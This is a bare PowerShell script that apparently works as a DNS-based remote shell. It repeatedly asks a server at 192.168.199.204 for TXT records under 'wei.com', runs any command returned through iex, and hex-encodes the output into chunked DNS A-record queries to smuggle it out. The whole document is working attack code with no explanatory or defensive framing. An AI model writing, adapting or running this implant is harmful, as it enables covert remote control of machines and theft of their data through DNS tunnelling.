$ip = "192.168.199.204"
$url="wei.com";
function execDNS($cmd) {
$c = iex $cmd 2>&1 | Out-String;
$u = [system.Text.Encoding]::UTF8.GetBytes($c);
$string = [System.BitConverter]::ToString($u);
$string = $string -replace '-','';
$len = $string.Length;
$split = 50;
$repeat=[Math]::Floor($len/$split);

for($i=0;$i-lt$repeat;$i++){
    $n = $i*$Split;
    $str = $string.Substring($n,$Split);
    $rnd = Get-Random;
	$payload = $rnd.ToString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = nslookup -querytype=A $payload $ip;
	$payload;
};
$remainder=$len%$split;
if($remainder){
    $n = $i*$Split;
    $str = $string.Substring($n,$remainder);
    $rnd = Get-Random;
	$payload = $rnd.ToString()+".CMD"+$i.ToString()+"."+$str+"."+$url;
    $q = nslookup -querytype=A $payload $ip;
	$payload;
};

$rnd = Get-Random;
$payload=$rnd.ToString()+".END."+$url;
$q = nslookup -querytype=A $payload $ip;
$payload;
};
while (1){
    Start-Sleep -s 3
    $rnd = Get-Random;
	$u = $rnd.ToString()+"."+$url
    $txt = nslookup -querytype=TXT $u $ip | Out-String
    $txt = $txt.split("`n") | %{$_.split('"')[1]} | Out-String
    if ($txt -match 'NoCMD'){continue}
    elseif ($txt -match 'exit'){Exit}
    else{execDNS($txt)}
}    